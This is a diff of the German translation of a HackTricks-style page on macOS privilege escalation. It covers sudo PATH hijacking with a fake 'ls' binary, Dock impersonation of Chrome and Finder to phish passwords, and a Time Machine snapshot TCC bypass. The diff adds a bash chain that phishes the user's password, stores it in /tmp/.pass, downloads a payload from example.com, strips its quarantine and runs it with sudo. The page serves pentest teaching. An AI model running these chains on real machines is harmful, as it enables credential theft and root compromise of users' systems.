@@ -1,10 +1,11 @@
-# macOS Privilegieneskalation
+# macOS Privilege Escalation
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TCC Privilegieneskalation
+## TCC Privilege Escalation
 
-Wenn Sie hierher gekommen sind, um nach TCC-Privilegieneskalation zu suchen, gehen Sie zu:
+Wenn du hierher gekommen bist, um nach TCC privilege escalation zu suchen, gehe zu:
+
 
 {{#ref}}
 macos-security-protections/macos-tcc/
@@ -12,7 +13,8 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Bitte beachten Sie, dass **die meisten Tricks zur Privilegieneskalation, die Linux/Unix betreffen, auch MacOS**-Maschinen betreffen werden. Schauen Sie sich also an:
+Bitte beachten Sie, dass **die meisten Tricks zur privilege escalation, die Linux/Unix betreffen, sich auch auf MacOS auswirken**. Siehe:
+
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
@@ -20,11 +22,11 @@ Bitte beachten Sie, dass **die meisten Tricks zur Privilegieneskalation, die Lin
 
 ## Benutzerinteraktion
 
-### Sudo-Hijacking
+### Sudo Hijacking
 
-Sie finden die ursprüngliche [Sudo-Hijacking-Technik im Beitrag zur Linux-Privilegieneskalation](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Du findest die ursprüngliche [Sudo Hijacking technique im Linux Privilege Escalation Beitrag](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Allerdings **beibehält** macOS den **`PATH`** des Benutzers, wenn er **`sudo`** ausführt. Das bedeutet, dass ein anderer Weg, um diesen Angriff zu erreichen, darin bestehen würde, **andere Binärdateien zu hijacken**, die das Opfer weiterhin ausführen wird, wenn es **sudo** ausführt:
+Allerdings **bewahrt** macOS den **`PATH`** des Benutzers, wenn er **`sudo`** ausführt. Das bedeutet, dass ein anderer Weg, diesen Angriff durchzuführen, darin besteht, **hijack other binaries** zu platzieren, die das Opfer beim **Ausführen von sudo:** ausführt:
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -39,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Beachten Sie, dass ein Benutzer, der das Terminal verwendet, höchstwahrscheinlich **Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.
+Beachte, dass ein Benutzer, der das Terminal verwendet, sehr wahrscheinlich **Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.
 
-### Dock-Imitation
+### Dock Impersonation
 
-Mit etwas **Social Engineering** könnten Sie **zum Beispiel Google Chrome imitieren** und tatsächlich Ihr eigenes Skript ausführen:
+Mit etwas **social engineering** könntest du im Dock beispielsweise **impersonate Google Chrome** und tatsächlich dein eigenes Skript ausführen:
 
 {{#tabs}}
-{{#tab name="Chrome-Imitation"}}
+{{#tab name="Chrome Impersonation"}}
 Einige Vorschläge:
 
-- Überprüfen Sie im Dock, ob es ein Chrome gibt, und entfernen Sie in diesem Fall **diesen Eintrag** und **fügen Sie** den **falschen** **Chrome-Eintrag an derselben Stelle** im Dock-Array hinzu.
+- Prüfe im Dock, ob ein Chrome vorhanden ist, und **entferne** in diesem Fall diesen Eintrag und **füge** den **fake** **Chrome entry in the same position** im Dock-Array hinzu.
 ```bash
 #!/bin/sh
 
@@ -124,11 +126,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Einige Vorschläge:
 
-- Sie **können den Finder nicht aus dem Dock entfernen**, also wenn Sie ihn zum Dock hinzufügen möchten, könnten Sie den gefälschten Finder direkt neben den echten setzen. Dafür müssen Sie **den gefälschten Finder-Eintrag am Anfang des Dock-Arrays hinzufügen**.
-- Eine andere Möglichkeit ist, ihn nicht im Dock zu platzieren und ihn einfach zu öffnen, "Finder fragt, um den Finder zu steuern" ist nicht so seltsam.
-- Eine weitere Möglichkeit, um **ohne Passwortabfrage** auf Root zu eskalieren, ist, den Finder wirklich nach dem Passwort zu fragen, um eine privilegierte Aktion auszuführen:
-- Bitten Sie den Finder, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren (Die Eingabeaufforderung, die nach dem Passwort fragt, wird anzeigen, dass "Finder sudo kopieren möchte")
-- Bitten Sie den Finder, ein neues **Authorization Plugin** zu kopieren (Sie könnten den Dateinamen steuern, sodass die Eingabeaufforderung, die nach dem Passwort fragt, anzeigt, dass "Finder Finder.bundle kopieren möchte")
+- Du kannst **Finder nicht aus dem Dock entfernen**, also wenn du ihn dem Dock hinzufügen willst, könntest du den gefälschten Finder direkt neben dem echten platzieren. Dafür musst du **den gefälschten Finder-Eintrag am Anfang des Dock-Arrays hinzufügen**.
+- Eine andere Option ist, es nicht im Dock zu platzieren und es einfach zu öffnen; "Finder asking to control Finder" ist nicht so seltsam.
+- Eine weitere Möglichkeit, um ohne eine hässliche Passwortabfrage **escalate to root without asking** zu erreichen, ist, Finder wirklich das Passwort anfragen zu lassen, um eine privilegierte Aktion auszuführen:
+- Fordere Finder auf, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren (Die Passwortabfrage wird anzeigen, dass "Finder wants to copy sudo")
+- Fordere Finder auf, ein neues **Authorization Plugin** zu kopieren (Du könntest den Dateinamen kontrollieren, sodass die Passwortabfrage anzeigt, dass "Finder wants to copy Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -201,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Root-Rechteausweitung
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - mount_apfs TCC-Umgehung und Rechteausweitung
+Malware missbraucht häufig Benutzerinteraktion, um **ein sudo-fähiges Passwort zu erfassen** und es programmgesteuert wiederzuverwenden. Ein typischer Ablauf:
 
-**Jeder Benutzer** (auch unprivilegierte) kann einen Time Machine-Snapshot erstellen und einbinden und **auf ALLE Dateien** dieses Snapshots zugreifen.\
-Die **einzige Berechtigung**, die benötigt wird, ist, dass die verwendete Anwendung (wie `Terminal`) **Vollzugriff auf die Festplatte** (FDA) hat (`kTCCServiceSystemPolicyAllfiles`), was von einem Administrator gewährt werden muss.
+1. Ermittle den angemeldeten Benutzer mit `whoami`.
+2. **Passwortabfragen wiederholen**, bis `dscl . -authonly "$user" "$pw"` Erfolg zurückgibt.
+3. Speichere die Anmeldeinformationen (z. B. `/tmp/.pass`) und führe privilegierte Aktionen mit `sudo -S` aus (Passwort über stdin).
+
+Beispiel einer minimalen Kette:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+Das gestohlene Passwort kann dann wiederverwendet werden, um **die Gatekeeper-Quarantäne mit `xattr -c` zu löschen**, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stufen nicht-interaktiv auszuführen.
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Jeder Benutzer** (auch nicht-privilegierte) kann einen time machine snapshot erstellen und mounten und **auf ALLE Dateien** dieses Snapshots zugreifen.\
+Das **einzige Privileg**, das benötigt wird, ist, dass die verwendete Anwendung (wie `Terminal`) **Full Disk Access** (FDA) hat (`kTCCServiceSystemPolicyAllfiles`), welches von einem Admin gewährt werden muss.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -226,9 +249,9 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Eine detailliertere Erklärung kann [**im ursprünglichen Bericht**](https://theevilbit.github.io/posts/cve_2020_9771/)** gefunden werden.**
+Eine detailliertere Erklärung kann [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-## Sensible Informationen
+## Empfindliche Informationen
 
 Dies kann nützlich sein, um Privilegien zu eskalieren:
 
@@ -236,5 +259,9 @@ Dies kann nützlich sein, um Privilegien zu eskalieren:
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## Referenzen
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
